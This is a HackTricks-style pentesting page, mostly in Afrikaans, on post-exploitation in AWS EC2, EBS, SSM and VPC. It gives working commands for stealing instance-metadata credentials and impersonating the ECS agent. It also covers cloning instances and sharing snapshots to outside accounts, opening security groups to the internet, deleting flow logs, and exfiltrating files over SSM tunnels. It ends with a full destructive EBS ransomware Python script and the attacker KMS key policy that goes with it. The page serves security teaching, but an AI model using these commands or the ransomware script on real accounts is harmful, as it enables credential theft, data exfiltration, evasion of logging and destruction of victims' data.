# AWS - EC2, EBS, SSM & VPC Post-uitbuiting

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Vir meer inligting sien:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Kwaadaardige VPC-spieël -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **dupliseer inkomende en uitgaande verkeer vir EC2-instansies binne 'n VPC** sonder die behoefte om enigiets op die instansies self te installeer. Hierdie gedupliseerde verkeer word gewoonlik na iets soos 'n network intrusion detection system (IDS) gestuur vir ontleding en monitering.\
'n Aanvaller kan dit misbruik om al die verkeer te kap en sensitiewe inligting daaruit te verkry:

Vir meer inligting sien hierdie bladsy:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Kopieer lopende instansie

Instansies bevat gewoonlik 'n vorm van sensitiewe inligting. Daar is verskillende maniere om binne te kom (check [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). 'n Ander manier om te kyk wat dit bevat, is egter om **'n AMI te skep en 'n nuwe instansie daaruit te laat hardloop (selfs in jou eie rekening)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, wat gewoonlik **sensitiewe inligting** sal bevat; daarom behoort die inspeksie daarvan hierdie inligting te openbaar.\
As jy 'n **volume without a snapshot** vind, kan jy: **Create a snapshot** en die volgende aksies uitvoer of dit net **mount it in an instance** binne die rekening:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Export an EC2 AMI straight to S3 using `CreateStoreImageTask` om 'n rou skyfbeeld te bekom sonder snapshot sharing. Dit maak volledige offline forensiese ondersoeke of datadiefstal moontlik terwyl die instance-netwerk ongemoeid gebly word.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Attach an io1/io2 Multi-Attach volume to a second instance en mount dit read-only om live data af te tap sonder snapshots. Nuttig wanneer die victim volume reeds Multi-Attach binne dieselfde AZ geaktiveer het.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Create an EC2 Instance Connect Endpoint, authorize ingress, en inject ephemeral SSH keys om private instances oor 'n managed tunnel te bereik. Bied vinnige laterale bewegingspaaie sonder om publieke poorte te oop te maak.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Move a victim ENI’s secondary private IP na 'n attacker-controlled ENI om vertroude hosts te impersonate wat per IP op 'n allowlist is. Maak dit moontlik om interne ACLs of SG-reëls wat aan spesifieke adresse gekoppel is, te omseil.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reassociate an Elastic IP van die victim instance na die attacker om inkomende verkeer te onderskep of uitgaande verbindings te initieer wat blykbaar vanaf vertroude publieke IP's kom.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

As 'n security group-regel na 'n customer-managed prefix list verwys, sal die byvoeging van attacker CIDRs tot die lys stilweg toegang uitbrei oor elke afhanklike SG-reël sonder om die SG self te wysig.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Create gateway of interface VPC endpoints om uitgaande toegang vanaf geïsoleerde subnets te herwin. Deur AWS-managed private links te benut, kan ontbrekende IGW/NAT-beheermaatreëls omseil word vir data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

An attacker with the `ec2:AuthorizeSecurityGroupIngress` permission kan inkomende reëls by security groups voeg (byvoorbeeld om `tcp:80` vanaf `0.0.0.0/0` toe te laat), waardeur interne dienste aan die publieke Internet of andersins ongemagtigde netwerke blootgestel word.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
'n Aanvaller met `ec2:ReplaceNetworkAclEntry` (of soortgelyke) magte kan 'n subnet se Network ACLs (NACLs) wysig om hulle baie permissief te maak — byvoorbeeld om 0.0.0.0/0 op kritieke poorte toe te laat — en sodoende die hele subnet-reeks aan die Internet of aan ongemagtigde netwerksegmente bloot te stel. Anders as Security Groups, wat per-instance toegepas word, word NACLs op subnet-vlak toegepas, so die verander van 'n beperkende NACL kan 'n veel groter blast radius hê deur toegang tot baie meer hosts moontlik te maak.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

'n Aanvaller met ec2:Delete* en iam:Remove* magte kan kritieke infrastruktuurhulpbronne en konfigurasies uitvee — byvoorbeeld key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, of managed endpoints. Dit kan onmiddellike diensonderbreking, dataverlies, en verlies van forensiese bewyse veroorsaak.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Wys VPC Flow Logs na 'n aanvaller-beheerde S3 bucket om netwerkmetadata (source/destination, ports) buite die slagoffer se rekening deurlopend te versamel vir langtermyn reconnaissance.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Selfs as jy 'n EC2 toesluit sodat geen verkeer kan uitgaan nie, kan dit steeds **exfil via DNS**.

- **VPC Flow Logs will not record this**.
- You have no access to AWS DNS logs.
- Disable this by setting "enableDnsSupport" to false with:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

'n Aanvaller kan API endpoints van 'n rekening wat hy beheer, aanroep. CloudTrail sal hierdie oproepe log en die aanvaller sal die exfiltrate data in die CloudTrail logs kan sien.

### Open Security Group

Jy kan verdere toegang tot netwerkdienste kry deur poorte so te open:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

It's possible to run an EC2 instance an register it to be used to run ECS instances and then steal the ECS instances data.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

'n Kompromie binne enige ECS task wat op 'n EC2 container instance loop is gewoonlik genoeg om in die host-rol te pivot en die IAM-rolle geassosieer met al die ander tasks op daardie node te bekom. Omdat daar **geen task isolasie vir ECS-on-EC2** is nie, kan elke task standaard die EC2 Instance Metadata Service (IMDS) bevraag, die container instance profile steel, en dan dieselfde WebSocket-protokol praat wat die ECS agent gebruik teen die control plane (die **ECScape** primitief) om die credentials vir elke taak wat tans op daardie host geskeduleer is te versoek. Latacora het hierdie workflow gedokumenteer in hul [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/), wat die volgende offensiewe samevatting kondenseer.

#### Attack chain

1. **Steal the instance profile from inside the container.** Assume IMDSv2 is required, so request a token and then fetch the profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Use the container instance role to impersonate the ECS agent.** With those credentials you can speak the undocumented WebSocket channel the ECS agent uses; the control plane trusts you as the real agent and delivers **all task IAM credentials** to your process. You can now run higher-privileged tasks locally, dump task environment secrets, or update services/tasks to redeploy workloads you can fully inspect.

#### IMDS reachability with IMDSv2 + hop limit 1

Setting IMDSv2 with `HttpTokens=required` and `HttpPutResponseHopLimit=1` only blocks tasks that live behind an extra hop (Docker bridge). Other networking modes stay within one hop of the Nitro controller and still receive responses:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Elke taak kry sy eie ENI wat steeds een hop weg van IMDS is, so tokens en metadata-antwoorde arriveer suksesvol. |
| `host` | ✅ | Tasks deel die host-namespace, so hulle sien dieselfde hop-afstand as die EC2 instance. |
| `bridge` | ❌ | Antwoorde sterf op die Docker bridge omdat daardie ekstra hop die hop limit uitput. |

Therefore, **never assume hop limit 1 protects awsvpc or host-mode workloads**—always test from inside your containers.

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Security groups, NACLs, of routing-wysigings kan die link-local 169.254.169.254 adres nie blokkeer nie omdat Nitro dit on-host injekteer. Kyk na `/etc/ecs/ecs.config` vir `ECS_AWSVPC_BLOCK_IMDS=true`. As die vlag ontbreek (default) kan jy IMDS direk vanaf die taak curl. As dit gestel is, pivot na die host/agent namespace om dit terug te sit of voer jou tooling buite awsvpc uit.

- **bridge mode:** Wanneer metadata-versoeke misluk selfs al is hop limit 1 geconfigureer, het verdedigers waarskynlik 'n `DOCKER-USER` drop-reël ingesit soos `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Om `iptables -S DOCKER-USER` te lys blootlê dit, en root-toegang laat jou toe om die reël te verwyder of te herorden voordat jy IMDS bevraagteken.

- **host mode:** Inspekteer die agentkonfigurasie vir `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. Daardie instelling verwyder task IAM rolle heeltemal, so jy moet óf dit weer aktiveer, na awsvpc tasks skuif, óf credentials deur 'n ander proses op die host steel. Wanneer die waarde `true` is (default), kan elke host-mode proses — insluitend gekompromitteerde containers — IMDS bereik tensy spesifieke eBPF/cgroup filters na `169.254.169.254` mik; soek na tc/eBPF programme of iptables-reëls wat daardie adres noem.

Latacora het selfs [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) vrygestel wat jy in 'n teikenaccount kan los om te enumereer watter netwerkmodusse steeds metadata blootstel en jou volgende stap dienooreenkomstig te beplan.

Sodra jy verstaan watter modusse IMDS blootstel kan jy jou post-exploitation-pad beplan: mik enige ECS task, versoek die instance profile, impersonate die agent, en oes elke ander task-rol vir lateral movement of persistence binne die cluster.

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Vereiste toestemmings:

- `ssm:StartSession`

Benewens die uitvoering van opdragte, laat SSM traffic tunneling toe wat misbruik kan word om te pivot vanaf EC2 instances wat nie netwerktoegang het as gevolg van Security Groups of NACLs nie.
Een van die scenario's waar dit nuttig is, is om te pivot vanaf 'n [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) na 'n private EKS cluster.

> Om 'n sessie te begin, moet die SessionManagerPlugin geïnstalleer wees: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Installeer die SessionManagerPlugin op jou masjien
2. Teken aan by die Bastion EC2 met die volgende opdrag:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Kry die Bastion EC2 AWS tydelike credentials met die [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script
4. Dra die credentials oor na jou eie masjien in die `$HOME/.aws/credentials` lêer as die `[bastion-ec2]` profiel
5. Meld aan by EKS as die Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Werk die `server`-veld in die `$HOME/.kube/config`-lêer by om na `https://localhost` te wys
7. Skep 'n SSM-tunnel soos volg:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Die verkeer van die `kubectl` tool word nou deur die SSM tunnel via die Bastion EC2 deurgelei en jy kan die privaat EKS cluster vanaf jou eie masjien bereik deur die volgende uit te voer:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Neem kennis dat die SSL-verbindinge sal misluk tensy jy die `--insecure-skip-tls-verify ` vlag (of sy ekwivalent in K8s-auditgereedskap) stel. Aangesien die verkeer deur die veilige AWS SSM-tonnel getunnel word, is jy veilig teen enige vorm van MitM-aanvalle.

Laastens, hierdie tegniek is nie spesifiek tot die aanval op privaat EKS-klusters nie. Jy kan arbitrêre domeine en poorte instel om na enige ander AWS-diens of 'n pasgemaakte toepassing te pivot.

---

#### Vinnige Plaaslike ↔️ Afgeleë Poort-vooruitstuur (AWS-StartPortForwardingSession)

As jy net moet deurstuur **een TCP-poort van die EC2-instantie na jou plaaslike host** kan jy die `AWS-StartPortForwardingSession` SSM-dokument gebruik (geen remote host-parameter nodig nie):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Die opdrag vestig 'n tweerigting-tonnel tussen jou werkstasie (`localPortNumber`) en die gekose poort (`portNumber`) op die instance **sonder om enige inkomende Security-Group rules oop te maak**.

Gereelde gebruiksgevalle:

* **File exfiltration**
1. Op die instance begin 'n vinnige HTTP-server wat na die gids wys wat jy wil exfiltrate:

```bash
python3 -m http.server 8000
```

2. Vanaf jou werkstasie haal die lêers deur die SSM-tonnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Toegang tot interne webtoepassings (bv. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Wenk: Komprimeer en enkripteer bewyse voordat jy dit exfiltreer, sodat CloudTrail nie die clear-text inhoud registreer nie:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Deel AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Soek sensitiewe inligting in openbare en privaat AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel is 'n hulpmiddel wat ontwerp is om **na sensitiewe inligting in openbare of privaat Amazon Machine Images (AMIs) te soek**. Dit outomatiseer die proses om instances vanaf teiken-AMIs te begin, hul volumes te koppel, en hulle te deursoek vir potensiële secrets of sensitiewe data.

### Deel EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

'n bewys van konsep soortgelyk aan die Ransomware-demonstrasie wat in die S3 post-exploitation notes gedemonstreer is. KMS behoort hernoem te word na RMS vir Ransomware Management Service, gegewe hoe maklik dit is om verskeie AWS-dienste daarmee te enkripteer.

Eerstens, vanuit 'n 'attacker' AWS account, skep 'n klantbeheerde sleutel in KMS. Vir hierdie voorbeeld sal ons AWS net die sleuteldata vir my laat bestuur, maar in 'n realistiese scenario sou 'n malicious actor die sleuteldata buite AWS se beheer hou. Verander die sleutelbeleid om enige AWS account Principal toe te laat om die sleutel te gebruik. Vir hierdie sleutelbeleid was die account se naam 'AttackSim' en die beleidsreël wat alle toegang toelaat, word 'Outside Encryption' genoem.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Die sleutelbeleidreël benodig die volgende geaktiveer om die vermoë te hê om dit te gebruik om 'n EBS-volume te enkripteer:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Nou, met die publiek-toeganklike sleutel beskikbaar om te gebruik, kan ons 'n 'victim' rekening gebruik wat 'n paar EC2-instances opgestart het met nie-geënkripteerde EBS-volumes aangeheg. Die EBS-volumes van hierdie 'victim' rekening is wat ons teiken vir enkripsie; hierdie aanval vind plaas onder die veronderstelling van 'n oortreding van 'n hoë-privilegie AWS-rekening.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Soortgelyk aan die S3 ransomware-voorbeeld. Hierdie aanval sal kopieë van die aangehegte EBS-volumes skep deur gebruik te maak van snapshots, die publiek beskikbare sleutel van die 'attacker' rekening gebruik om die nuwe EBS-volumes te enkripteer, dan die oorspronklike EBS-volumes van die EC2-instances loskoppel en verwyder, en uiteindelik die snapshots verwyder wat gebruik is om die nuut-geënkripteerde EBS-volumes te skep. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Dit lei daartoe dat slegs geënkripteerde EBS-volumes in die rekening oorbly.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Ook vermeldenswaardig: die skrip het die EC2-instances gestop om die oorspronklike EBS-volumes los te koppel en te verwyder. Die oorspronklike nie-geënkripteerde volumes is nou weg.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Gaan volgende terug na die sleutelbeleid in die 'attacker' rekening en verwyder die 'Outside Encryption' beleidreël uit die sleutelbeleid.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Wag 'n oomblik sodat die nuut ingestelde sleutelbeleid kan deurwerk. Keer dan terug na die 'victim' rekening en probeer om een van die nuut-geënkripteerde EBS-volumes aan te heg. Jy sal sien dat jy die volume kan aanheg.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Maar wanneer jy probeer om die EC2 instance met die geënkripteerde EBS-volume weer op te start, sal dit net misluk en van die 'pending' toestand terug na die 'stopped' toestand gaan en daar bly, omdat die aangehegte EBS-volume nie met die key gedekripteer kan word nie aangesien die sleutelbeleid dit nie meer toelaat.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Dit is die python script wat gebruik is. Dit neem AWS creds van 'n 'victim' rekening en 'n publiek beskikbare AWS ARN-waarde vir die sleutel wat vir enkripsie gebruik gaan word. Die script sal geënkripteerde kopieë maak van ALLE beskikbare EBS-volumes wat aangeheg is aan ALLE EC2-instances in die geteikende AWS-rekening, dan elke EC2-instance stop, die oorspronklike EBS-volumes loskoppel, dit uitvee, en uiteindelik al die snapshots wat tydens die proses gebruik is, verwyder. Dit sal slegs geënkripteerde EBS-volumes in die geteikende 'victim' rekening agterlaat. GEBRUIK HIERDIE SCRIPT SLEGS IN 'N TOETSOMGEWING — DIT IS DESTRUKTIEF EN SAL AL DIE OORSPRONGLIKE EBS-VOLUMES VERWYDER. Jy kan dit herstel met die gebruikte KMS key en dit via snapshots na hul oorspronklike toestand herstel, maar ek wil jou net bewus maak dat dit uiteindelik 'n ransomware PoC is.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Verwysings

- [Latacora - ECS on EC2: Covering Gaps in IMDS Hardening](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
